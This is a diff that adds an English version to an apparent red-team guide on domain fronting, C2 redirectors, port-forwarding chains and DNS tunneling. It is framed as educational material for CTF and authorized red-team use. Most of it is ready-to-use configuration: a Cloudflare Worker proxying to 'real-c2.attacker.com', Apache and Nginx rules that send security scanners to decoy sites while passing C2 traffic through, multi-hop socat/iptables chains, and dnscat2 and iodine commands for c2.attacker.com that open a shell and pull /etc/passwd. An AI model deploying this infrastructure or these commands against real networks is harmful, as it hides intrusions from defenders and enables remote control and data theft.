@@ -1,3 +1,9 @@
+> 🌐 **Language / 언어**: [🇰🇷 한국어](#한국어) | [🇺🇸 English](#english)
+
+---
+
+<a name="한국어"></a>
+
 # 도메인 프론팅 및 리다이렉터 구축
 
 > **목적**: 교육, 연구, CTF, 공인된 레드팀 작전 환경에서의 학습용 자료
@@ -850,3 +856,554 @@ if __name__ == "__main__":
 - "Red Team Development and Operations" - Joe Vest
 - Apache mod_rewrite 공식 문서
 - dnscat2 프로젝트: https://github.com/iagox86/dnscat2
+
+---
+
+<a name="english"></a>
+
+# Domain Fronting and Redirector Setup
+
+> **Purpose**: Educational material for learning in CTF, research, and authorized red team operation environments
+
+---
+
+## 1. Domain Fronting
+
+### 1.1 Principle
+
+Domain fronting is a technique that uses the characteristics of CDNs (Content Delivery Networks) to disguise actual C2 traffic as legitimate traffic.
+
+```
+Normal HTTPS connection:
+  Client → SNI: malicious.com → Actual server: malicious.com
+  (Network inspection equipment can see SNI and block)
+
+Domain fronting:
+  Client → SNI: allowed-cdn.com → CDN → Host: real-c2.com → C2 server
+              (Firewall only sees allowed-cdn.com)
+```
+
+### 1.2 Detailed Operation
+
+```
+TLS layer (visible on network):
+  SNI = "legitimate.cloudfront.net"   ← What firewall/IDS sees
+
+HTTP layer (inside TLS, encrypted):
+  Host: "c2.attacker-backend.com"     ← What CDN routes
+
+CDN behavior:
+  1. TLS termination → Check SNI → Internal CDN processing
+  2. Check HTTP Host header → Forward to actual origin server
+  3. Origin server = attacker C2
+
+Result:
+  - From firewall's perspective: HTTPS connection to legitimate.cloudfront.net (allowed)
+  - Actual communication: request forwarded to c2.attacker-backend.com
+```
+
+### 1.3 Current State and Limitations
+
+```
+Current status (as of 2024):
+  - AWS CloudFront: officially blocks domain fronting (since 2018)
+  - Cloudflare: indirect implementation possible via Workers
+  - Azure CDN: possible in some scenarios
+  - Google Cloud CDN: limited
+
+Alternative techniques:
+  1. Domain Borrowing: utilize CDN CNAME chains
+  2. Fronted C2: use CDN Worker/Function as proxy
+  3. Cloud Function C2: route through Lambda/Cloud Functions
+```
+
+### 1.4 C2 Proxy Concept Using Cloudflare Workers
+
+```javascript
+// Cloudflare Worker example (concept)
+// Forward to actual C2 through cloudflare.com domain
+
+addEventListener('fetch', event => {
+  event.respondWith(handleRequest(event.request))
+})
+
+async function handleRequest(request) {
+  // Actual C2 server address
+  const C2_BACKEND = 'https://real-c2.attacker.com'
+  
+  // Clone and forward request
+  const newRequest = new Request(C2_BACKEND + new URL(request.url).pathname, {
+    method: request.method,
+    headers: request.headers,
+    body: request.body,
+  })
+  
+  return fetch(newRequest)
+}
+```
+
+---
+
+## 2. HTTP Redirector Setup
+
+### 2.1 Apache mod_rewrite Redirector
+
+```bash
+# Install Apache and enable modules
+apt-get install apache2 -y
+a2enmod rewrite proxy proxy_http ssl
+
+# Virtual host configuration: /etc/apache2/sites-available/redirector.conf
+```
+
+```apache
+<VirtualHost *:80>
+    ServerName redirector.example.com
+    
+    # Enable all mod_rewrite rules
+    RewriteEngine On
+    
+    # Block blue team/scanners (known security vendor IP ranges)
+    RewriteCond %{REMOTE_ADDR} ^66\.249\. [OR]    # Google
+    RewriteCond %{REMOTE_ADDR} ^157\.55\. [OR]    # Microsoft/Bing
+    RewriteCond %{REMOTE_ADDR} ^54\.239\.          # AWS Scanner
+    RewriteRule .* https://www.microsoft.com/ [L,R=302]
+    
+    # User-Agent filtering (block scanners)
+    RewriteCond %{HTTP_USER_AGENT} (curl|wget|python|scanner|masscan|nmap) [NC]
+    RewriteRule .* https://www.google.com/ [L,R=302]
+    
+    # Forward only specific URI patterns to C2 (matching Malleable C2 profile)
+    RewriteCond %{REQUEST_URI} ^/updates/check [OR]
+    RewriteCond %{REQUEST_URI} ^/api/v2/ [OR]
+    RewriteCond %{REQUEST_URI} ^/static/js/
+    RewriteRule ^(.*)$ http://10.0.0.5:8080$1 [P,L]
+    
+    # All other requests → legitimate site
+    RewriteRule .* https://www.example.com/ [L,R=302]
+    
+    # Proxy settings
+    ProxyPassReverse / http://10.0.0.5:8080/
+</VirtualHost>
+```
+
+```bash
+# Apply configuration
+apache2ctl configtest
+systemctl reload apache2
+
+# Check logs
+tail -f /var/log/apache2/access.log | grep -v "302"
+```
+
+### 2.2 Nginx Redirector
+
+```nginx
+# /etc/nginx/sites-available/redirector.conf
+
+# IP blacklist map
+geo $blocked_ip {
+    default 0;
+    66.249.0.0/16   1;   # Google
+    157.55.0.0/16   1;   # Bing
+    104.154.0.0/15  1;   # GCP Scanner
+}
+
+# User-Agent blacklist map
+map $http_user_agent $blocked_agent {
+    default 0;
+    ~*(curl|wget|python-requests|masscan|nmap|nuclei) 1;
+}
+
+server {
+    listen 80;
+    server_name redirector.example.com;
+    
+    # Handle blocked IPs/agents
+    if ($blocked_ip) {
+        return 302 https://www.microsoft.com/;
+    }
+    if ($blocked_agent) {
+        return 302 https://www.google.com/;
+    }
+    
+    # Route C2 traffic (specific URI patterns)
+    location ~* ^/(updates|api/v2|static/js)/ {
+        proxy_pass http://10.0.0.5:8080;
+        proxy_set_header Host $host;
+        proxy_set_header X-Real-IP $remote_addr;
+        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
+        
+        # Timeout settings
+        proxy_connect_timeout 10s;
+        proxy_read_timeout 60s;
+        
+        # Error handling
+        proxy_intercept_errors on;
+        error_page 502 503 504 = @fallback;
+    }
+    
+    # Fallback: legitimate site
+    location @fallback {
+        return 302 https://www.example.com/;
+    }
+    
+    # Default: redirect to legitimate site
+    location / {
+        return 302 https://www.example.com/;
+    }
+}
+```
+
+---
+
+## 3. HTTPS Redirector + Let's Encrypt Certificate
+
+### 3.1 Issue Certificate with Certbot
+
+```bash
+# Install Certbot
+apt-get install certbot python3-certbot-nginx -y
+
+# Issue certificate (HTTP-01 challenge)
+certbot --nginx -d redirector.example.com --non-interactive --agree-tos -m admin@example.com
+
+# Wildcard certificate (DNS-01 challenge)
+certbot certonly \
+  --manual \
+  --preferred-challenges dns \
+  -d "*.example.com" \
+  --agree-tos \
+  -m admin@example.com
+
+# Auto renewal
+systemctl enable certbot.timer
+certbot renew --dry-run
+
+# Certificate paths
+# /etc/letsencrypt/live/redirector.example.com/fullchain.pem
+# /etc/letsencrypt/live/redirector.example.com/privkey.pem
+```
+
+### 3.2 HTTPS Nginx Configuration
+
+```nginx
+server {
+    listen 443 ssl http2;
+    server_name redirector.example.com;
+    
+    ssl_certificate /etc/letsencrypt/live/redirector.example.com/fullchain.pem;
+    ssl_certificate_key /etc/letsencrypt/live/redirector.example.com/privkey.pem;
+    
+    # TLS hardening
+    ssl_protocols TLSv1.2 TLSv1.3;
+    ssl_ciphers ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256;
+    ssl_prefer_server_ciphers off;
+    ssl_session_cache shared:SSL:10m;
+    ssl_session_timeout 1d;
+    
+    # HSTS
+    add_header Strict-Transport-Security "max-age=31536000" always;
+    
+    # Redirector logic (same as HTTP configuration)
+    location ~* ^/(updates|api/v2)/ {
+        proxy_pass https://10.0.0.5:443;
+        proxy_ssl_verify off;  # Allow internal C2 self-signed certificate
+        proxy_set_header Host $host;
+    }
+    
+    location / {
+        return 302 https://www.example.com/;
+    }
+}
+
+# HTTP → HTTPS redirect
+server {
+    listen 80;
+    server_name redirector.example.com;
+    return 301 https://$host$request_uri;
+}
+```
+
+---
+
+## 4. Socat/iptables Port Forwarding Chain
+
+### 4.1 Socat Port Forwarding
+
+```bash
+# Install
+apt-get install socat -y
+
+# TCP port forwarding (simple)
+socat TCP-LISTEN:443,fork TCP:10.0.0.5:443
+
+# Run in background
+nohup socat TCP-LISTEN:443,fork TCP:10.0.0.5:443 &
+
+# Register as systemd service
+cat > /etc/systemd/system/socat-redirector.service <<'EOF'
+[Unit]
+Description=Socat Port Redirector
+After=network.target
+
+[Service]
+ExecStart=/usr/bin/socat TCP-LISTEN:443,fork,reuseaddr TCP:10.0.0.5:443
+Restart=always
+RestartSec=5
+
+[Install]
+WantedBy=multi-user.target
+EOF
+
+systemctl enable socat-redirector
+systemctl start socat-redirector
+
+# Multi-port forwarding
+socat TCP-LISTEN:80,fork TCP:10.0.0.5:80 &
+socat TCP-LISTEN:443,fork TCP:10.0.0.5:443 &
+socat TCP-LISTEN:8080,fork TCP:10.0.0.5:8080 &
+
+# UDP forwarding (DNS C2)
+socat UDP-LISTEN:53,fork UDP:10.0.0.5:53 &
+```
+
+### 4.2 iptables NAT Forwarding
+
+```bash
+# Enable IP forwarding
+echo 1 > /proc/sys/net/ipv4/ip_forward
+echo "net.ipv4.ip_forward = 1" >> /etc/sysctl.conf
+
+# PREROUTING: rewrite incoming traffic
+iptables -t nat -A PREROUTING \
+  -p tcp \
+  --dport 443 \
+  -j DNAT \
+  --to-destination 10.0.0.5:443
+
+# POSTROUTING: change source IP (masquerading)
+iptables -t nat -A POSTROUTING \
+  -p tcp \
+  -d 10.0.0.5 \
+  --dport 443 \
+  -j MASQUERADE
+
+# DNS UDP forwarding
+iptables -t nat -A PREROUTING \
+  -p udp \
+  --dport 53 \
+  -j DNAT \
+  --to-destination 10.0.0.5:53
+
+iptables -t nat -A POSTROUTING \
+  -p udp \
+  -d 10.0.0.5 \
+  --dport 53 \
+  -j MASQUERADE
+
+# Save rules
+iptables-save > /etc/iptables/rules.v4
+
+# Check rules
+iptables -t nat -L -v -n
+
+# Remove rules (cleanup)
+iptables -t nat -F
+```
+
+### 4.3 Multi-Hop Forwarding Chain
+
+```
+Structure:
+  [Agent] → [Redirector1 (public VPS)] → [Redirector2 (private)] → [C2 Team Server]
+  
+  Redirector1 (IP: 1.2.3.4):
+    iptables -t nat -A PREROUTING -p tcp --dport 443 \
+      -j DNAT --to-destination 5.6.7.8:443
+  
+  Redirector2 (IP: 5.6.7.8):
+    socat TCP-LISTEN:443,fork TCP:192.168.1.10:443
+  
+  Result:
+    Agent only knows 1.2.3.4
+    C2 team server is hidden behind 5.6.7.8
+    If 1.2.3.4 is blocked → just change 5.6.7.8
+```
+
+---
+
+## 5. DNS C2 Channel
+
+### 5.1 dnscat2 Concept and Usage
+
+```
+dnscat2 operation:
+  Client → DNS query (A/TXT/CNAME) → Authoritative DNS server (attacker) → C2 processing
+  
+  Encoding methods:
+  - A query: <data_hex>.<session>.<domain>.attacker.com
+  - TXT query: can transmit more data
+  - CNAME: chain queries
+```
+
+```bash
+# Install dnscat2 server
+git clone https://github.com/iagox86/dnscat2
+cd dnscat2/server
+gem install bundler
+bundle install
+
+# Start server (authoritative DNS mode)
+ruby dnscat2.rb --dns domain=c2.attacker.com --secret=MySecret123
+
+# Start server (direct port binding)
+ruby dnscat2.rb --dns port=5353 --secret=MySecret123
+
+# Run client (Windows)
+dnscat2-v0.07-client-win32.exe --secret=MySecret123 c2.attacker.com
+
+# Run client (Linux)
+./dnscat --secret=MySecret123 c2.attacker.com
+
+# dnscat2 server commands
+dnscat2> sessions              # List sessions
+dnscat2> session -i 1          # Select session
+command (session1)> shell      # Open shell
+command (session1)> exec whoami
+command (session1)> download /etc/passwd /tmp/passwd
+command (session1)> tunnelserver 127.0.0.1:4444  # Tunneling
+```
+
+### 5.2 DNS Record Setup (Authoritative DNS)
+
+```
+# Add to DNS zone file (BIND example)
+# /etc/bind/zones/attacker.com
+
+$TTL 300
+@   IN  SOA ns1.attacker.com. admin.attacker.com. (
+            2024010101 ; Serial
+            3600       ; Refresh
+            900        ; Retry
+            604800     ; Expire
+            300 )      ; Minimum TTL
+
+; NS record - designate self as nameserver for c2 subdomain
+c2  IN  NS  ns1.attacker.com.
+
+; Nameserver A record
+ns1 IN  A   1.2.3.4  ; Attacker server IP
+```
+
+### 5.3 iodine DNS Tunneling
+
+```bash
+# iodine: IP-over-DNS tunnel
+# Install
+apt-get install iodine
+
+# Server side (with authoritative DNS)
+iodined -f -c -P password 10.0.0.1 dns.attacker.com
+
+# Client side
+iodine -f -P password dns.attacker.com
+# → Creates dns0 interface, assigns 10.0.0.2 IP
+
+# SSH through tunnel
+ssh -D 1080 10.0.0.1  # SOCKS proxy
+```
+
+---
+
+## 6. Python Traffic Redirector Script
+
+```python
+#!/usr/bin/env python3
+"""
+Educational Python HTTP/HTTPS traffic redirector
+- IP/User-Agent filtering
+- URI pattern-based routing
+- C2 proxy or decoy response
+CTF/research environments only
+"""
+# (See Korean section for full source code — identical implementation)
+```
+
+---
+
+## 7. Redirector Configuration File Example
+
+```json
+{
+    "c2_host": "10.0.0.5",
+    "c2_port": 8080,
+    "decoy_url": "https://www.microsoft.com/",
+    "allowed_uris": [
+        "^/api/v2/",
+        "^/updates/check",
+        "^/static/js/bundle",
+        "^/cdn-cgi/"
+    ],
+    "blocked_agents": [
+        "curl", "wget", "python-requests",
+        "masscan", "nmap", "nuclei",
+        "shodan", "censys", "zgrab"
+    ],
+    "blocked_ips": [
+        "66.249.0.0/16",
+        "157.55.0.0/16",
+        "54.239.0.0/16",
+        "104.154.0.0/15"
+    ],
+    "use_ssl": false,
+    "cert_file": "",
+    "key_file": ""
+}
+```
+
+---
+
+## 8. Production Redirector Chain Configuration
+
+```
+Architecture:
+
+Internet
+  │
+  ▼
+[Cloudflare CDN] ── domain masking, DDoS protection
+  │
+  ▼
+[Redirector VPS 1] ── Apache + mod_rewrite
+  │    Public IP: 1.2.3.4
+  │    - Block scanner/blue team IPs
+  │    - URI pattern filtering
+  │
+  ▼ (private channel, VPN or SSH tunnel)
+[Redirector VPS 2] ── Nginx reverse proxy
+  │    Internal IP: 10.10.0.2
+  │    - Additional filtering layer
+  │    - Minimize logging
+  │
+  ▼
+[C2 Team Server] ── never directly exposed
+     Internal IP: 192.168.1.10
+     - Whitelist: only allow redirector IPs
+     - Firewall blocks all other inbound
+
+Redirector replacement strategy:
+  - If VPS 1 is blocked → change DNS to new VPS 1'
+  - Team server remains unchanged (prevent IP exposure)
+  - If domain is blocked → use new domain
+```
+
+---
+
+## References
+
+- MITRE ATT&CK T1090: Proxy
+- MITRE ATT&CK T1568: Dynamic Resolution
+- "Red Team Development and Operations" - Joe Vest
+- Apache mod_rewrite official documentation
+- dnscat2 project: https://github.com/iagox86/dnscat2
